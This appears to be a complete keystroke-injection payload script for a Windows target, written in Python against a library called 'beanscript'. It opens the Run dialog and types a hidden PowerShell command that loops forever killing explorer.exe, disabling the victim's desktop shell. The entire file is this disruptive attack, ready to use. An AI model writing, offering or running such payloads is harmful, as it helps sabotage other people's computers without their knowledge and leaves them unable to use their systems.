import beanscript
import time

#A simple bean which kills explorer.exe on Windows

def main():
    beanscript.super("r")
    time.sleep(0.5)
    beanscript.write("powershell /w 1 while($true){kill -name explorer}\n")
